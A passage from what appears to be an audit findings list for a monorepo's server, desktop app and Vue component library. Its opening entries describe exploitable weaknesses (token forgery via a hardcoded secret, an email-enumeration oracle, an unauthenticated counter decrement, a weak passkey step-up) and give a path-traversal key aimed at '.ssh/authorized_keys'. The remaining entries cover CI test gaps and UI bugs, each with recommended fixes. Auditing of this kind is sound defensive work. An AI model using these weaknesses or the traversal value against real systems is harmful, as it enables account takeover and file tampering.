failure_scenario: On Cloudflare Pages secrets arrive as event.context.cloudflare.env bindings; this function only reads useRuntimeConfig() and process.env, so all four candidates are undefined and the hardcoded constant is used. An attacker who reads this repo can then mint valid doc tokens (createDocToken payloads are attacker-chosen sid/path/cid/rl) and pass the verifyDocToken gate at api/docs/engagement.post.ts:122, defeating the anti-tamper layer on doc engagement analytics. The comparison at line 277 is also non-constant-time, and line 252 uses SHA256(input + '.' + secret) rather than HMAC.
recommendation: Route this secret through readCloudflareBindings + assertRuntimeCredential, delete the hardcoded fallback, and switch to createHmac('sha256', secret) with timingSafeEqual.

title: Unauthenticated account-existence oracle at /api/auth/email-status
summary: The endpoint has no auth guard, no Turnstile check and no rate limiting (no global middleware applies one -- server/middleware only does CORS, canonical-origin, docs redirect, feature gates and credential assertion), yet returns whether an arbitrary email is registered and its account status.
failure_scenario: An attacker scripts GET /api/auth/email-status?email=<candidate> over a breach list and gets a clean exists:true/false plus status (active/disabled/pending deletion) for every address, with no throttle. The same oracle is duplicated at api/passkeys/options.get.ts:10, which additionally returns the victim's registered passkey credential ids. The harvested list feeds credential stuffing and the OAuth-linking takeover above.
recommendation: Require a Turnstile token (as /api/auth/register does) and apply per-IP rate limiting, or return a constant response and move the existence signal behind the verified sign-in flow.

title: Unauthenticated endpoint decrements any plugin's public install counter
summary: /api/store/uninstall has no auth guard, no rate limit and no proof that the caller ever installed the plugin; it decrements the store-wide installs counter for whatever slug is posted.
failure_scenario: An anonymous attacker loops POST /api/store/uninstall {"slug":"competitor-plugin"}. Each call runs UPDATE plugins SET installs = MAX(0, installs - 1) (pluginsStore.ts:3424), so the publicly displayed install count for any plugin can be driven to 0 within seconds while the attacker leaves their own plugin's count untouched -- direct manipulation of store social proof.
recommendation: Require an authenticated session or app token, record uninstalls per (user, device, plugin) so a decrement can only undo a prior install by that identity, and rate-limit the endpoint.

title: Admin passkey step-up accepts a presence-only assertion (userVerified discarded)
summary: verifyAssertionResponse returns userVerified (webauthn.ts:325) but the handler drops it and mints a login token anyway; combined with userVerification: 'preferred' at passkeys/options.get.ts:33, the token that requireAdminStepUp and the control-plane channel-A guard treat as second-factor proof can be produced without any PIN or biometric.
failure_scenario: Someone who obtains an admin's hardware security key with no PIN configured calls the unauthenticated POST /api/passkeys/verify with a presence-only assertion (UV flag clear). The handler ignores result.userVerified, issues a 10-minute login token, and that token satisfies consumeLoginToken(event, loginToken, 'passkey') in requireAdminStepUp (auth.ts:439) and requireAdminSessionChannel (adminControlPlaneGuard.ts:243). The 'Passkey step-up required' control on risk/emergency admin actions is passed with a single key touch and no second factor.
recommendation: Set userVerification: 'required' in the options endpoint and reject the assertion when result.userVerified is false for step-up-eligible tokens.

title: PR CI gate runs only 7 of 1147 test files; 623 core-app tests never execute in CI
summary: The only test step on the PR path is `pnpm quality:pr` -> `pnpm test:targeted`, which hardcodes 7 individual test file paths. The repo has 1147 test files (623 in apps/core-app alone). No workflow runs `pnpm -C apps/core-app test` (`vitest run`), so the entire core-app suite, the tuffex suite (143 files) and the nexus suite (179 files) never run on a pull request.
evidence: package.json:38 `"test:targeted": "corepack pnpm -C \"packages/utils\" exec vitest run \"__tests__/plugin-sdk-lifecycle.test.ts\" \"__tests__/transport-domain-sdks.test.ts\" \"__tests__/transport/port-policy.test.ts\" && corepack pnpm -C \"apps/core-app\" exec vitest run \"src/renderer/src/modules/auth/sync-preferences.test.ts\" \"src/main/modules/plugin/plugin-loaders.test.ts\" \"src/main/channel/common.test.ts\" && corepack pnpm -C \"apps/nexus\" exec vitest run \"test/api/sync/sync-routes-410.test.ts\""` ; package.json:39 `"quality:pr": "... && corepack pnpm test:targeted && ..."` ; .github/workflows/ci.yml job_quality_pr runs only `pnpm quality:pr`. package-utils-ci.yml is path-filtered to `packages/utils/**`; native-protocol.yml and windows-everything-production.yml are path-filtered and name individual files.
failure_scenario: A regression in any of the 616 untested-in-CI core-app test files ships undetected. Example: someone breaks plugin lifecycle in apps/core-app/src/main/modules/plugin/host/plugin-runtime-host.ts; its 2500-line test file plugin-runtime-host.test.ts would catch it locally, but the PR goes green because CI never invokes it. The suite exists but provides zero merge-blocking signal.
recommendation: Add a CI job running the full `vitest run` per workspace (sharded/matrixed if slow), or expand test:targeted to whole-suite invocation.

title: `pnpm utils:test` launches vitest in watch mode and never terminates
summary: CLAUDE.md documents `pnpm utils:test` as "Run tests for utility packages". It resolves to `pnpm -F test run test` -> `vitest` (no `run` subcommand), which is watch mode. Every other package uses `vitest run`. Any non-interactive caller (script, agent, pre-commit hook, or a CI job that does not set the CI env var) hangs until timeout instead of reporting results.
evidence: packages/test/package.json:12 `"test": "vitest",` — compare apps/core-app/package.json:14 `"test": "vitest run"` and packages/utils/package.json:52 `"test": "vitest run"`. Root package.json:37 `"utils:test": "pnpm -F test run test"`.
failure_scenario: An automated pipeline or contributor script that shells out to `pnpm utils:test` blocks forever rather than failing fast on a real test failure; the packages/test suite (aisdk provider, download notification, core-box tuff-builder, native protocol tests) yields no pass/fail signal in any non-TTY context.
recommendation: Change to `vitest run` and add a separate `test:watch` script.

title: Plugin SQLite worker integration suite silently self-skips when out/main is not built
summary: The whole describe block is gated on `existsSync(path.resolve('out/main/plugin-sqlite-worker.js'))`, a CWD-relative path to a build artifact. Nothing in the repo builds `out/main` before running tests, and no CI workflow references plugin-sqlite-worker at all. When the artifact is missing the suite reports as skipped-but-green rather than failing, so the plugin SQLite sandboxing checks (including the symlink-escape assertions this file sets up via `symlink`) never actually run.
evidence: apps/core-app/src/main/modules/plugin/runtime/plugin-sqlite-worker.integration.test.ts:14-15 `const workerPath = path.resolve('out/main/plugin-sqlite-worker.js')` / `const describeBuiltWorker = existsSync(workerPath) ? describe : describe.skip`. `grep -rn 'plugin-sqlite-worker' .github/workflows/` returns nothing.
failure_scenario: A regression in plugin SQLite database path resolution (resolvePluginSqliteDatabasePath) that lets a plugin escape its sandbox directory via symlink ships undetected, because on any machine or runner where `out/main` is absent the guarding tests are converted to no-ops instead of erroring.
recommendation: Fail loudly (throw) when the worker artifact is missing in CI, and add a build step; keep the auto-skip only behind an explicit opt-out env var.

title: macOS screenshot integration test is permanently dormant - its enabling env var is set nowhere
summary: The single test in this file runs only when `TUFF_SCREENSHOT_MACOS_INTEGRATION === '1'`. That variable is not set in any workflow, package.json script, or mise task, so the test has never executed in CI. The secondary gate `TUFF_SCREENSHOT_MACOS_REQUIRE_AX` (used at line 114 to assert accessibility behaviour) is likewise never set, so even a manual run skips its strongest assertions.
evidence: native-screenshot-macos.integration.test.ts:8-10 `const enabled = process.platform === 'darwin' && process.env.TUFF_SCREENSHOT_MACOS_INTEGRATION === '1'` / `const requireAx = process.env.TUFF_SCREENSHOT_MACOS_REQUIRE_AX === '1'`; line 23 `it.runIf(enabled)(...)`. `grep -rn 'TUFF_SCREENSHOT_MACOS_INTEGRATION' .github/ package.json apps/core-app/package.json` returns no matches.
failure_scenario: The test's stated guarantee — 'runs the complete protocol flow without exposing image JSON' — is unverified. A change to NativeTransport that serialises captured screen bytes into the JSON control channel (a privacy leak of screen contents into logs) would not be caught, since the only assertion covering it never runs.
recommendation: Set the env var in the macOS leg of native-protocol.yml, or delete the test rather than keeping a dormant guarantee.

title: App config key path-traversal sanitizer has zero tests
summary: `normalizeConfigKey` and `resolveLegacyPath` are the containment boundary that stops an attacker-influenced config key from writing outside the config root. The 662-line file is imported by no test file anywhere in the repo (verified by grep across apps/core-app/src and packages).
evidence: app-config-repository.ts:92-108 rejects keys that are absolute, contain NUL or backslash, or have `.`/`..`/empty segments; :111-119 `resolveLegacyPath` re-checks with `path.relative(root, resolved)` and throws `Config key escapes legacy root`. No `*.test.ts` in the repo imports `app-config-repository`.
failure_scenario: A refactor that drops the `segment === '..'` check (or the `key.includes('\\')` check, which is what blocks `..\\..\\` on Windows) reintroduces directory traversal: a plugin- or IPC-supplied config key such as `../../.ssh/authorized_keys` would resolve outside the config root and be overwritten by storage:save. Nothing in the suite would fail.
recommendation: Add a table-driven test for normalizeConfigKey/resolveLegacyPath covering `..`, `.`, empty segments, backslashes, NUL, and absolute POSIX/Win32 keys.

title: Plugin channel key issuance/revocation (channel isolation boundary) is only ever mocked, never tested
summary: `TouchChannel.requestKey`/`revokeKey`/`isValidKey`/`resolveIdentity` implement the per-plugin channel isolation described in CLAUDE.md ('Plugin channels use encrypted keys instead of direct names'). Every test that touches these replaces them with `vi.fn()`; the real 978-line channel-core.ts is imported by exactly one test file, which exercises CommonChannelModule handlers rather than key lifecycle.
evidence: channel-core.ts:159-204 maintains three maps (nameToKeyMap/keyToNameMap/keyToIdentityMap) and rotates the key when `existingIdentity.pluginInstanceId !== activation.pluginInstanceId || existingIdentity.activationGeneration !== activation.activationGeneration`. All test hits are stubs, e.g. apps/core-app/src/main/modules/plugin/plugin.test.ts:260-261 `requestKey: vi.fn(), revokeKey: vi.fn()`.
failure_scenario: A regression in the activation-generation comparison at :166-173 makes `requestKey` return the previous generation's key after a plugin reload. The stale key stays valid in keyToIdentityMap, so an old/disabled plugin activation keeps sending on a channel it should have lost — cross-activation message injection with no failing test.
recommendation: Unit-test requestKey key rotation across activation generations, revokeKey map cleanup, and that a revoked key fails isValidKey/resolveIdentity.

title: quick-ops natural-language duration/pomodoro parser (461 lines) has no tests
summary: quick-ops-query-parser.ts converts free-text user queries into timer durations and pomodoro schedules. The quick-ops module has six test files, none of which import this parser (verified by grep). Its sibling services (session manager, filesystem, network, system) are likewise untested, but the parser is the highest-risk unit because its output directly sets wall-clock timers.
evidence: quick-ops-query-parser.ts:298 `export function parseDurationMs(text: string): number | null`, :307 `export function parseDurationPartsMs(text: string): number[]`, :327 `parsePomodoroCycle`, :353 `parsePomodoroLongBreak`, :425 `parseCustomPomodoroTemplate`. No file matching `quick-ops-query-parser*.test.ts` exists; the directory listing shows only index/evidence/flow-ai-adapter-audit/runtime-host/surface-audit tests.
failure_scenario: A unit-conversion regression (minutes read as seconds, or a regex that matches '25' before '25m') makes a requested 25-minute focus session fire after 25 seconds, or a 'screen clean for 1h' request never end. Both are user-visible timer corruption with no test to catch the off-by-1000.
recommendation: Add table-driven parse tests over representative zh/en phrasings asserting exact millisecond output, including ambiguous and no-match inputs.

title: lint:changed gate script is untested and silently drops --max-warnings=0
summary: `scripts/run-eslint-changed.mjs` is the lint half of the PR quality gate (`quality:pr` -> `lint:changed`). It has no test. Its eslint invocations omit `--max-warnings=0`, which the full `pnpm lint` script does pass, so the PR gate accepts code that the release gate (`quality:release` -> `pnpm lint`) rejects.
evidence: scripts/run-eslint-changed.mjs:133-146 `lintWorkspace` builds `['pnpm','-C',workspace,'exec','eslint','--cache','--no-warn-ignored',...files]` and :148-152 `lintRoot` builds `['pnpm','exec','eslint','--cache','--no-warn-ignored',...files]` — neither passes `--max-warnings=0`. Root package.json:41 `"lint": "... exec eslint --cache --max-warnings=0 --no-warn-ignored ..."`.
failure_scenario: Two failure modes with no test: (1) warning-level rule violations merge through PR CI and only blow up later at release time; (2) a regression in `groupByWorkspace` (scripts/run-eslint-changed.mjs:111-131, which relies on workspaces being sorted longest-prefix-first so `packages/tuffex/packages/components` wins over `packages/tuffex`) would misroute files to the wrong eslint config, and since eslint exits 0 on an empty/ignored file list the gate would report OK while linting nothing.
recommendation: Add unit tests for groupByWorkspace prefix precedence and for the assembled argv; add --max-warnings=0 to match pnpm lint.

title: stream-markdown auto theme observes documentElement only, misses <body> theme toggles
summary: `detect()` explicitly reads the theme from BOTH `document.documentElement` and `document.body`, but the MutationObserver is attached only to `documentElement` with no `subtree`. Any app that toggles dark mode on `<body>` gets a correct first paint and then a permanently stale theme.
failure_scenario: App renders `<TxStreamMarkdown theme="auto" />` while `<body>` has no dark class, then the user flips dark mode and the app runs `document.body.classList.add('dark')`. `detect()` would now return 'dark', but the observer never fires because only `documentElement` is watched, so the markdown (and every fenced TxCodeBlock/TxMermaidBlock that inherits `resolvedTheme`) stays on the github-light Shiki theme against a dark page until some unrelated `documentElement` class/attribute mutation happens to fire the observer.
recommendation: Also observe `document.body` (guarding for null before hydration), or narrow `detect()` to `documentElement` so the read surface matches the observed surface.

title: TxMermaidBlock id counter is per-instance, so every diagram renders with the same DOM id
summary: `let mermaidIdSeq = 0` sits at the top level of `<script setup>`, which the compiler places inside `setup()` — so it is per-component-instance state, not the module-level monotonic counter its own comment claims. Every TxMermaidBlock instance therefore starts at 0 and its first render uses the id `tx-mermaid-1`.
failure_scenario: One streamed assistant message contains two ```mermaid fences. Both blocks settle and both call `mermaid.render('tx-mermaid-1', ...)`. Mermaid derives the emitted SVG's root id and all internal marker/clipPath ids from that string, so the page now holds two elements with id `tx-mermaid-1` plus duplicate marker ids; the second diagram's `url(#tx-mermaid-1_flowchart-pointEnd)` references resolve to the first diagram's defs, dropping its arrowheads. When both renders overlap in the same tick they also contend for mermaid's temporary `#dtx-mermaid-1` mount node, and one diagram falls through to the 'Diagram failed to render' fallback.
recommendation: Hoist the counter into a normal `<script>` block (or a module-scope helper) so it is shared across instances, or seed it from a module-level `crypto.randomUUID()`/counter.

title: TxSelect numeric coercion makes an option with value 0 appear selected when nothing is selected
summary: `isSelectValueEqual` falls back to `Number()` coercion whenever both sides are string|number. `Number('')` is `0`, and the component's own `modelValue` default is `''`, so the empty/unselected state compares equal to any option whose value is `0`.
failure_scenario: Mount `<TxSelect :options="[{ value: 0, label: 'Zero' }, { value: 1, label: 'One' }]" />` with no `modelValue`, so `props.modelValue` takes its `''` default. `isValueSelected(0)` calls `isSelectValueEqual(0, '')`, both coerce to `0`, and returns true — the 'Zero' row renders with `is-selected`/`aria-selected="true"` and `resolveLabelByValue('')` returns 'Zero', so the trigger shows 'Zero' instead of the placeholder. Calling the exposed `clear()` sets `''` again and the phantom selection immediately returns. The same coercion also equates `'0x10'` with `16` and `'1e3'` with `1000`.
recommendation: Only coerce when neither side is an empty/whitespace string (e.g. bail if `String(v).trim() === ''`), or drop the coercion and require callers to keep value types consistent.

title: TxSelect combobox cannot be opened or navigated from the keyboard
summary: The default (non-editable, non-multiple) trigger is a readonly `TuffInput` carrying `role="combobox"`/`aria-haspopup="listbox"`/`aria-expanded`, but nothing binds a keydown handler. `TxBaseAnchor` (which backs TxPopover) only wires `@click.capture` on the reference plus a document-level Escape, so there is no Enter/Space/ArrowDown path to open the panel and no arrow-key/`aria-activedescendant` navigation once it is open.
evidence:
<TuffInput
  v-else
  ref="triggerInputRef"
  v-model="triggerText"
  :placeholder="placeholder"
  :readonly="!isEditable"
  :disabled="disabled"
  role="combobox"
  aria-haspopup="listbox"
  :aria-expanded="isOpen"
  @focus="openFromFocus"
>
failure_scenario: A keyboard-only or screen-reader user tabs to a default `<TxSelect :options="..." />`. Focus lands on the readonly input; `openFromFocus` returns immediately because `isEditable` is false, and pressing Enter, Space or ArrowDown produces no click event on a readonly input, so `TxBaseAnchor`'s `@click.capture="handleReferenceClick"` never runs. The listbox never opens and the control is completely unusable without a pointer, while `aria-haspopup="listbox"` promises assistive tech that it can be opened.
recommendation: Add a keydown handler on the trigger for Enter/Space/ArrowDown (open) plus ArrowUp/ArrowDown/Home/End/Enter option navigation with `aria-activedescendant`, per the ARIA combobox pattern.

title: TxStreamMarkdown keeps stale sanitized HTML when `sanitize` flips true to false
summary: The watcher that resets the block cache on a `sanitize` change does not re-run the render. Rendering is driven by a separate `[content, canRender]` watcher, and flipping `sanitize` from true to false leaves `canRender` at `true` and `content` unchanged, so neither dependency fires and `blocks.value` keeps the HTML produced under the old mode.
failure_scenario: A settled (non-streaming) `<TxStreamMarkdown :content="md" :sanitize="allowRaw ? false : true" />` is on screen with DOMPurify loaded, so `canRender` is `true`. The user toggles `allowRaw`, so `props.sanitize` goes true -> false. `stream.reset()` clears the entry cache, but `canRender` stays `true` and `content` never changes, so the render watcher never fires and the DOM keeps showing DOMPurify-stripped HTML. The opt-out silently has no effect until the next content mutation.
recommendation: Add `() => props.sanitize` as a third source of the render watcher (and call `stream.reset()` inside it) so a mode change always recomputes.

title: TxFormItem `required` prop is decorative: validate() passes when no rules are supplied
summary: `validate()` only iterates `resolvedRules`. The `required` prop is honoured inside `runRule`, but `runRule` is reachable only from that loop, so an item declaring `required` with no `rules` (and no matching entry in the form's `rules` map) has an empty rule list and validates as passing while still rendering the required marker.
failure_scenario: `<TxForm :model="model"><TxFormItem label="Name" prop="name" required>…</TxFormItem></TxForm>` with `model.name = ''`. `isRequired` is true so the item renders the `is-required` styling, but `resolvedRules` is `[]` because neither `props.rules` nor `form.rules['name']` exists. The `for` loop body never runs, `validate()` clears the error, emits `validate(true)` and returns true — so `TxForm.validate()` reports the whole form valid and the app submits an empty required field with no visible error.
recommendation: In `validate()`, run an explicit required check (or synthesize a `{ required: true }` rule) when `props.required` is set and `resolvedRules` is empty.

title: markdown-editor serializer never escapes markdown syntax, corrupting tables and literal text
summary: `serializeTable` joins cell text with ` | ` and every other branch emits `serializeInlineChildren(node)` verbatim. Nothing escapes `|`, `*`, `_`, `` ` `` or a leading `#`, so plain text typed into the contenteditable surface is re-emitted as markdown syntax.
failure_scenario: In `TxMarkdownEditor` the user pastes or builds a 2-column table and types `a | b` into one cell. `serializeMarkdown` emits `| a | b | other |`, which now reads as three columns and no longer matches the `| --- | --- |` separator row, so re-parsing the emitted markdown yields a different (broken) table than the one on screen. The same gap makes a literal `*emphasis*` or a line starting with `# ` round-trip into real emphasis/heading markup on the next parse.
recommendation: Escape `|` (as `\|`) inside table cells and backslash-escape leading block markers plus inline `*`/`_`/`` ` `` in text nodes before emitting.

title: TxConversationStream never observes its load-older sentinel when mounted with an empty list
summary: The IntersectionObserver is created in `onMounted` and requires `sentinelRef.value` to already exist, but the sentinel lives inside the `v-else` branch of `v-if="items.length === 0"`. A component that mounts with no items has no sentinel (and no top zone) at that moment, and nothing re-creates or re-observes them when items later arrive.
failure_scenario: A chat view renders `<TxConversationStream :items="messages" :load-older="fetchOlder" />` while `messages` is still `[]` (the usual async first paint). At `onMounted` the template is on the `v-if` empty branch, so `sentinelRef.value` and `topZoneRef.value` are both null: the IntersectionObserver is never constructed and the top zone is never handed to the ResizeObserver. Messages then arrive, the sentinel and top zone mount, but only `liveRef` has a re-observing watcher — so scrolling to the top never calls `loadOlder` (infinite history loading is dead for the whole session) and `topZoneHeight` stays 0, offsetting every virtualized item position by the top zone's real height.
recommendation: Watch `sentinelRef`/`topZoneRef` the way `liveRef` is already watched, creating/observing lazily when the elements appear.

title: TxConversationStream `hasMoreInitial` is read once, so history loading stays dead after a list swap
summary: `hasMore` is seeded from `props.hasMoreInitial` at setup time and is never re-synced. Once it flips to false the `watch(hasMore)` permanently disconnects the IntersectionObserver, and re-supplying `hasMoreInitial: true` for a different conversation cannot revive it.
failure_scenario: A user scrolls conversation A to the top until `loadOlder()` returns `{ hasMore: false }`; `hasMore` goes false and the observer is disconnected. The user then opens conversation B, and the parent swaps `:items` and sets `:has-more-initial="true"`. Because nothing watches `hasMoreInitial`, the local `hasMore` ref stays false, the `top-done` slot renders instead of the loader, and the disconnected observer is never re-observed — conversation B's older messages are unreachable for the lifetime of the component.
recommendation: Add `watch(() => props.hasMoreInitial, v => { if (v !== undefined) hasMore.value = v })` and re-observe the sentinel when it turns true again.

title: tuffex typecheck omits noUncheckedIndexedAccess that its Nuxt consumer enforces
summary: `packages/tuffex/tsconfig.json` sets `strict` but not `noUncheckedIndexedAccess`, so `pnpm typecheck` is green. `apps/nexus` aliases `@talex-touch/tuffex/*` straight at tuffex source and its generated tsconfigs do enable the flag, so the same source is checked twice at two different strictness levels and only the consumer sees the failures.
evidence:
"strict": true,
"noImplicitAny": true,
"skipLibCheck": true,
failure_scenario: `node ./node_modules/vue-tsc/bin/vue-tsc.js --noEmit -p tsconfig.json` exits 0 today, but adding `--noUncheckedIndexedAccess` (the setting present in every generated `apps/nexus/**/.nuxt/tsconfig*.json`, while `nuxt.config.ts` points `tuffexComponentsSourceRoot` at `packages/tuffex/packages/components/src`) reports 60+ errors across `markdown-editor/src/markdown-serializer.ts`, `thinking-orb/src/engine/{lattice,morph,web}.ts`. A contributor who lands a genuine out-of-bounds index in tuffex passes the package gate and only breaks Nexus's typecheck, where the error points into another package.
recommendation: Enable `noUncheckedIndexedAccess` in packages/tuffex/tsconfig.json and fix or explicitly assert the existing sites so the library gate matches the strictest consumer.

title: TxCommandPalette claims aria-modal but has no focus trap and its options double as tab stops
summary: The overlay is `role="dialog" aria-modal="true"` but binds no Tab handler, unlike sibling TxModal/TxDrawer which both implement traps. Worse, every command is a real `<button :tabindex="cmd.disabled ? -1 : 0">` inside a `role="listbox"`, so Tab moves DOM focus through options that the ARIA combobox contract says should be `tabindex="-1"` and driven only by `aria-activedescendant`.
evidence:
role="dialog"
aria-modal="true"
:aria-label="ariaLabel"
@click.self="close"
...
<button
  v-for="(cmd, index) in filteredCommands"
  :id="`${listId}-opt-${index}`"
  role="option"
  :aria-selected="index === activeIndex"
  :tabindex="cmd.disabled ? -1 : 0"
failure_scenario: With the palette open, the user presses Tab. Focus leaves the input and lands on the first command button, but `activeIndex` does not move — so the `is-active` highlight and `aria-selected` still point at a different row than the one that now has focus, and `onKeydown` (bound only to the input) no longer receives ArrowUp/ArrowDown or Escape. Continuing to Tab past the last command walks focus straight out of the supposedly modal dialog into the page behind it, where nothing is `inert` or `aria-hidden`.
recommendation: Set `tabindex="-1"` on the option buttons and add a Tab trap on the overlay (or mark the option list `aria-hidden` from the tab order and keep navigation on `aria-activedescendant` only).

title: TxTree resets user-expanded nodes whenever the parent re-renders an inline defaultExpandedKeys
summary: `defaultExpandedKeys` is watched by reference and overwrites the whole internal expansion set. An inline array literal produces a new reference on every parent render, so unrelated parent state changes silently collapse whatever the user expanded — the exact hazard TxDataTable documents and guards against for `defaultSort`.
failure_scenario: A page renders `<TxTree :nodes="nodes" :default-expanded-keys="['root']" />` in uncontrolled mode (no `expandedKeys`). The user expands three more branches, then types in an unrelated search box on the same parent. The parent re-renders, the inline `['root']` literal is a fresh array, the watcher fires even though the content is identical, and `internalExpanded` is replaced with `Set{'root'}` — every branch the user opened snaps shut. TxDataTable avoids this by watching `[() => props.defaultSort?.key, () => props.defaultSort?.order]` with an explicit comment about inline literals.
recommendation: Watch the key list by value (e.g. its joined/sorted contents) as TxDataTable does, or apply `defaultExpandedKeys` only once at setup.

title: Uploaders never enforce `accept` on the drag-and-drop path
summary: `accept` is only forwarded to the `<input accept>` attribute, which the browser applies to the file picker alone. `onDrop` reads `e.dataTransfer.files` and hands everything straight to `addFiles`, which does no type or extension check.
failure_scenario: An app renders `<TxFileUploader accept="image/png" />`. Clicking the button opens a picker that only offers PNGs, but dragging a 200 MB `.mp4` (or an `.exe`) onto the drop zone adds it to `modelValue` and emits `add`/`change` with no warning. The consumer's submit handler then uploads a file type it explicitly declared it would not take, and the mismatch only surfaces server-side.
recommendation: Extract an `accept` matcher (MIME wildcard + extension) and filter in `addFiles` so both the picker and the drop path honour the same contract; emit a rejection event for filtered files.

title: Uploaders with `multiple: false` accumulate files instead of replacing the single slot
summary: `multiple` only reaches the `<input multiple>` attribute and the drop-path slice. `addFiles` always appends to the existing value and is bounded by `max` (default 10 / 9), not by `multiple`, so repeated single picks build a list on a component declared single-file.
failure_scenario: `<TxFileUploader :multiple="false" v-model="files" />` — the user picks `a.pdf`, realises it is wrong, clicks the button again and picks `b.pdf`. Instead of replacing the selection, `modelValue` becomes `[a.pdf, b.pdf]`; the list keeps growing to the `max` default of 10. `TxImageUploader.onInputChange` has the same append-only logic with `max` 9.
recommendation: When `multiple` is false, replace the value with the newly picked file (and revoke the previous object URL in TxImageUploader) instead of appending.

title: DialogManager ships a `priority` option that is never read and skips `cleanup` on unregister
summary: `DialogConfig.priority` is part of the public `@talex-touch/tuffex/utils` surface but no code path reads it — the stack is pure LIFO, so a `priority: 'high'` dialog never jumps the queue. Separately, `unregister` calls `onDestroy` but not `cleanup`, while `clearAll` calls both.
failure_scenario: A consumer imports `getDialogManager` from `@talex-touch/tuffex/utils`, registers a background dialog with `priority: 'low'` and then an urgent one with `priority: 'high'`, expecting the urgent one to win. Ordering is decided purely by push order, so the option silently does nothing. In the same API, a dialog registered with a `cleanup` that releases a listener or object URL never has it invoked when the dialog is unregistered individually — only a full `clearAll()` releases it.
recommendation: Either honour `priority` when choosing the visible dialog or drop the field from the public type; call `dialog.cleanup?.()` in `unregister` to match `clearAll`.

title: TxCommandPalette emits update:query but declares no `query` prop, so v-model:query is write-only
summary: `CommandPaletteEmits` declares `update:query` and the component emits it from both `onInput` and the close reset, but `CommandPaletteProps` has no `query` member. The v-model pair is half-implemented: the component pushes changes out and can never accept one in.
evidence:
export interface CommandPaletteProps {
  modelValue: boolean
  commands?: CommandPaletteItem[]
  placeholder?: string
  emptyText?: string
  maxHeight?: number
  autoFocus?: boolean
  closeOnSelect?: boolean
  overlayClass?: CommandPaletteClassValue
  panelClass?: CommandPaletteClassValue
  ariaLabel?: string
}

export interface CommandPaletteEmits {
  ...
  (e: 'update:query', value: string): void
}
failure_scenario: A parent writes `<TxCommandPalette v-model="open" v-model:query="q" />`. Typing updates `q` correctly, but when the app programmatically seeds the search (a deep link, a 'search for X' action, or restoring the last query) by setting `q = 'git'`, the palette's internal `query` ref never sees it and the input keeps showing the old text. Because `query` is not a declared prop it also falls through `$attrs` onto the rendered markup instead of being consumed.
recommendation: Add `query?: string` to `CommandPaletteProps` and drive the internal ref from it (or drop the `update:query` emit and document the palette's query as internal-only).

title: TxCascader swallows async `load` failures as unhandled promise rejections
summary: `ensureChildren` awaits `props.load(...)` with only a `finally` block — no `catch`. Its callers `onHoverItem`/`onPick` are `async` functions wired straight to `@mouseenter`/`@click`, so a rejected loader produces an unhandled rejection, and `CascaderEmits` has no error channel for the consumer to react to.
failure_scenario: `<TxCascader :load="fetchChildren" />` where `fetchChildren` hits the network. The user expands a node while offline; the promise rejects, `loadingKeys` clears so the spinner disappears, `loadedChildren` gets no entry, and the child column renders as an empty list that looks like a node with no children. The consumer gets no `error` emit to show a retry affordance and the browser logs an unhandled rejection from the template event handler.
recommendation: Wrap the `await props.load(...)` in try/catch, record a per-path error state, and add an `error` emit so consumers can surface a retry.

title: TxRating remounts the clicked star via a changing :key, throwing away keyboard focus
summary: The star's `:key` embeds the transient animation state, so selecting a star changes its key twice (idle -> pop -> idle). Each change makes Vue destroy and recreate the `<button>` element rather than patch it, and the browser drops focus when the focused element is removed.
evidence:
<button
  v-for="star in maxStars"
  :key="`${star}-${animatedStar === star ? 'pop' : 'idle'}`"
  type="button"
  class="tx-rating__star"
  ...
  @click="handleClick(star)"
failure_scenario: A keyboard user tabs to the third star and presses Enter. `handleClick` schedules `animatedStar = 3` in a rAF, the key flips from `3-idle` to `3-pop`, Vue unmounts the focused button and mounts a replacement, and focus falls back to `<body>` — the user loses their position in the tab order mid-interaction. 620ms later the key flips back to `3-idle` and the element is replaced again. Half-star selection (`precision: 0.5`), which requires clicking the same star twice, is therefore unreachable without re-tabbing from the top of the page.
recommendation: Keep `:key="star"` stable and restart the animation with a class toggle plus `animationend`, or re-trigger via `element.getAnimations()`/reflow instead of remounting.

title: TxRating radiogroup has no roving tabindex or arrow-key navigation
summary: The stars are declared `role="radiogroup"` / `role="radio"` but every star is a plain `<button>` with default tabindex and there is no keydown handler anywhere in the component. The ARIA radiogroup pattern requires exactly one tab stop for the group plus arrow-key movement between options.
evidence:
<div class="tx-rating__stars" role="radiogroup">
  <button
    v-for="star in maxStars"
    ...
    role="radio"
    :aria-checked="getStarAriaChecked(star)"
    :disabled="disabled || readonly"
    :aria-label="getStarLabel(star)"
    @click="handleClick(star)"
    @mouseenter="handleMouseEnter(star)"
    @mouseleave="handleMouseLeave"
  >
failure_scenario: With the default `maxStars: 5`, a keyboard user reaches the rating and must press Tab five separate times to get past it, because each radio is its own tab stop. Arrow keys — the movement mechanism assistive tech announces for a radiogroup — do nothing, so a screen-reader user following the announced affordance cannot change the rating at all.
